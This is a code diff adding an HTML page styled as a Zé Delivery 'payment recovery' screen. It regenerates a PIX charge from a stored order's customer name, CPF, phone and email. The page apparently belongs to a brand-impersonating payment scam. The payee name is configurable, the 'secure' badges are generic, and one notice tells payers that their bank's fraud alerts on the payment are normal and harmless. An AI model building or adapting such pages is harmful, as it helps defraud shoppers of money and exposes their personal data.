@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Recuperar Pagamento - Zé Delivery</title>
+  <script src="js/config.js"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: #ffcc01;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 28px 16px 48px;
+    }
+
+    .logo-wrap {
+      display: flex; align-items: center; gap: 10px;
+      margin-bottom: 22px;
+    }
+    .logo-img {
+      width: 52px; height: 52px; border-radius: 50%;
+      object-fit: cover; border: 3px solid #fff;
+    }
+    .logo-name { font-size: 18px; font-weight: 700; color: #1a1a1a; }
+
+    .card {
+      background: #fff;
+      border-radius: 20px;
+      width: 100%; max-width: 420px;
+      padding: 24px 20px;
+      box-shadow: 0 4px 20px rgba(0,0,0,.13);
+    }
+
+    /* ── Estados genéricos ── */
+    .state-wrap { text-align: center; padding: 32px 0; }
+    .state-icon { font-size: 48px; margin-bottom: 14px; }
+    .state-title { font-size: 18px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
+    .state-sub { font-size: 13px; color: #888; line-height: 1.55; }
+
+    /* ── PIX ── */
+    .pix-title { font-size: 16px; font-weight: 700; color: #1a1a1a; margin-bottom: 4px; }
+    .pix-valor { font-size: 13px; color: #555; margin-bottom: 18px; }
+
+    .qr-wrap { display: flex; justify-content: center; margin-bottom: 18px; }
+    .qr-skel {
+      width: 160px; height: 160px; border-radius: 12px;
+      border: 2px solid #eee; background: #f0f0f0;
+      position: relative; overflow: hidden;
+    }
+    .qr-skel::after {
+      content: ''; position: absolute; inset: 0;
+      background: linear-gradient(90deg, transparent 0%, rgba(255,255,255,.65) 50%, transparent 100%);
+      background-size: 200% 100%; animation: shimmer 1.4s infinite;
+    }
+    @keyframes shimmer { 0%{background-position:-200% 0} 100%{background-position:200% 0} }
+    .qr-img {
+      width: 160px; height: 160px; border-radius: 12px;
+      border: 2px solid #eee; object-fit: contain; display: block;
+    }
+
+    .code-label {
+      font-size: 10px; font-weight: 600; color: #888;
+      text-transform: uppercase; letter-spacing: .4px; margin-bottom: 5px;
+    }
+    .code-box {
+      background: #f5f5f5; border: 1.5px dashed #ddd; border-radius: 10px;
+      padding: 8px 12px; font-family: monospace; font-size: 10px; color: #444;
+      word-break: break-all; line-height: 1.6; cursor: pointer;
+      transition: background .2s; margin-bottom: 12px;
+    }
+    .code-box:hover { background: #efefef; }
+
+    .copy-btn {
+      width: 100%; background: #ffcc01; color: #1a1a1a;
+      border: none; border-radius: 24px; padding: 15px;
+      font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 15px;
+      cursor: pointer; display: flex; align-items: center; justify-content: center;
+      gap: 8px; transition: background .2s, color .2s; margin-bottom: 16px;
+    }
+    .copy-btn:hover { background: #f0c000; }
+    .copy-btn.copied { background: #077c22; color: #fff; }
+
+    .recebedor {
+      font-size: 12px; color: #888; text-align: center;
+      line-height: 1.6; margin-bottom: 16px;
+    }
+    .recebedor strong { color: #1a1a1a; white-space: nowrap; }
+
+    .badges {
+      display: flex; gap: 8px; justify-content: center;
+      flex-wrap: wrap; margin-bottom: 16px;
+    }
+    .badge {
+      display: flex; align-items: center; gap: 5px;
+      background: #f5f5f5; border-radius: 20px; padding: 6px 12px;
+      font-size: 11px; font-weight: 600; color: #555;
+    }
+
+    .aviso {
+      background: #fff8e1; border: 1.5px solid #ffe082;
+      border-radius: 12px; padding: 12px 14px;
+      display: flex; align-items: flex-start; gap: 9px;
+      font-size: 12px; color: #5a4000; line-height: 1.55;
+    }
+    .aviso i { margin-top: 2px; flex-shrink: 0; }
+  </style>
+</head>
+<body>
+
+  <div class="logo-wrap">
+    <img class="logo-img" src="images/ze-delivery-logo.webp" alt="Zé Delivery">
+    <span class="logo-name">Zé Delivery</span>
+  </div>
+
+  <div class="card" id="card">
+    <div class="state-wrap">
+      <div class="state-icon"><i class="fa fa-spinner fa-spin" style="font-size:36px;color:#ffcc01"></i></div>
+      <div class="state-sub">Buscando seu pedido...</div>
+    </div>
+  </div>
+
+  <script>
+    var nomeRecebedor = (typeof ZE_CONFIG !== 'undefined') ? ZE_CONFIG.nomeRecebedor : '';
+
+    function fmt(reais) {
+      return 'R$ ' + parseFloat(reais).toFixed(2).replace('.', ',');
+    }
+
+    function showLoading(msg) {
+      document.getElementById('card').innerHTML =
+        '<div class="state-wrap">'
+        + '<div class="state-icon"><i class="fa fa-spinner fa-spin" style="font-size:36px;color:#ffcc01"></i></div>'
+        + '<div class="state-sub">' + msg + '</div>'
+        + '</div>';
+    }
+
+    function showError(msg) {
+      document.getElementById('card').innerHTML =
+        '<div class="state-wrap">'
+        + '<div class="state-icon">😕</div>'
+        + '<div class="state-title">Algo deu errado</div>'
+        + '<div class="state-sub">' + msg + '</div>'
+        + '</div>';
+    }
+
+    function showPaid() {
+      document.getElementById('card').innerHTML =
+        '<div class="state-wrap">'
+        + '<div class="state-icon">✅</div>'
+        + '<div class="state-title">Pagamento já confirmado!</div>'
+        + '<div class="state-sub">Obrigado. Seu pedido está aprovado e em processamento.</div>'
+        + '</div>';
+    }
+
+    function showPix(pixCode, pixImg, valorReais) {
+      var valorStr = (valorReais !== null && !isNaN(valorReais)) ? fmt(valorReais) : '';
+      var qrHtml = pixImg
+        ? '<div class="qr-wrap"><img class="qr-img" src="' + pixImg + '" alt="QR Code PIX" onerror="this.style.display=\'none\'"></div>'
+        : '<div class="qr-wrap"><div class="qr-skel"></div></div>';
+
+      document.getElementById('card').innerHTML =
+          '<div class="pix-title">Finalize seu pagamento</div>'
+        + (valorStr ? '<div class="pix-valor">Valor: <strong>' + valorStr + '</strong></div>' : '')
+        + qrHtml
+        + '<button class="copy-btn" id="copy-btn" onclick="copiar()"><i class="fa fa-copy"></i> Copiar código PIX</button>'
+        + '<div class="recebedor">Confira o nome ao pagar:<br><strong>' + nomeRecebedor + '</strong></div>'
+        + '<div class="badges">'
+        +   '<div class="badge"><i class="fa fa-shield-halved" style="color:#077c22"></i> Pagamento protegido</div>'
+        +   '<div class="badge"><i class="fa fa-lock" style="color:#1a7a8a"></i> Ambiente seguro</div>'
+        + '</div>'
+        + '<div class="aviso"><i class="fa fa-triangle-exclamation"></i>'
+        +   '<span>Alguns bancos exibem alertas automáticos em pagamentos PIX online. É normal e não afeta seu pedido.</span>'
+        + '</div>';
+
+      window._pixCode = pixCode;
+    }
+
+    function copiar() {
+      var code = window._pixCode;
+      if (!code) return;
+      function onOk() {
+        var btn = document.getElementById('copy-btn');
+        if (!btn) return;
+        btn.classList.add('copied');
+        btn.innerHTML = '<i class="fa fa-check"></i> Copiado!';
+        setTimeout(function() {
+          btn.classList.remove('copied');
+          btn.innerHTML = '<i class="fa fa-copy"></i> Copiar código PIX';
+        }, 3000);
+      }
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(code).then(onOk).catch(function() { fbCopy(code, onOk); });
+      } else {
+        fbCopy(code, onOk);
+      }
+    }
+
+    function fbCopy(text, cb) {
+      var ta = document.createElement('textarea');
+      ta.value = text; ta.style.position = 'fixed'; ta.style.left = '-9999px';
+      document.body.appendChild(ta); ta.focus(); ta.select();
+      try { document.execCommand('copy'); if (cb) cb(); } catch(e) {}
+      document.body.removeChild(ta);
+    }
+
+    (async function() {
+      var id = new URLSearchParams(location.search).get('id');
+      if (!id) {
+        showError('Nenhum ID de pedido foi informado no link.');
+        return;
+      }
+
+      /* ── Passo 1: busca status do pedido original ── */
+      showLoading('Buscando seu pedido...');
+      var statusBody;
+      try {
+        var r = await fetch('/api/status-pix/' + encodeURIComponent(id));
+        statusBody = await r.json();
+      } catch(e) {
+        showError('Erro ao buscar o pedido. Tente novamente em instantes.');
+        return;
+      }
+
+      var d = statusBody.data || statusBody;
+      var status = (d.status || '').toLowerCase();
+
+      if (status === 'authorized' || status === 'paid' || status === 'approved' || status === 'completed') {
+        showPaid();
+        return;
+      }
+
+      /* ── Passo 2: gera novo PIX com os dados do pedido original ── */
+      showLoading('Gerando seu PIX...');
+
+      var valorRaw   = (d.amount_in_reais || '').toString().replace(',', '.');
+      var valorReais = parseFloat(valorRaw) || null;
+      var customer   = (d.customer_data && d.customer_data.customer) || {};
+      var descricao  = (d.customer_data && d.customer_data.description) || 'Pedido Recuperado';
+      var tracking   = (d.customer_data && d.customer_data.tracking) || {};
+      var utmKeys    = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term'];
+      var utmPayload = {};
+      utmKeys.forEach(function(k) { if (tracking[k]) utmPayload[k] = tracking[k]; });
+
+      var transacao;
+      try {
+        var resp = await fetch('/api/criar-pix', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(Object.assign({
+            produto: descricao,
+            valor:   valorRaw,
+            nome:    customer.name     || '',
+            cpf:     customer.document || '',
+            tel:     customer.phone    || '',
+            email:   customer.email    || ''
+          }, utmPayload))
+        });
+        transacao = await resp.json();
+        if (!resp.ok) throw new Error(JSON.stringify(transacao));
+      } catch(e) {
+        showError('Não foi possível gerar o PIX. Tente novamente em instantes.');
+        return;
+      }
+
+      var td      = transacao.data || transacao;
+      var pixData = td.pix || {};
+      var pixCode = pixData.qrcode || pixData.qr_code || '';
+      var pixImg  = (pixData.receiptUrl && pixData.receiptUrl !== 'null') ? pixData.receiptUrl
+                 : (pixData.url        && pixData.url        !== 'null') ? pixData.url
+                 : '';
+      if (pixCode && !pixImg) {
+        pixImg = 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(pixCode);
+      }
+
+      if (!pixCode) {
+        showError('Não foi possível gerar o código PIX. Tente novamente.');
+        return;
+      }
+
+      /* Salva UTMs no localStorage para o obrigado.html disparar o Purchase corretamente */
+      utmKeys.forEach(function(k) { if (tracking[k]) localStorage.setItem('ze_' + k, tracking[k]); });
+
+      showPix(pixCode, pixImg, valorReais);
+    })();
+  </script>
+</body>
+</html>
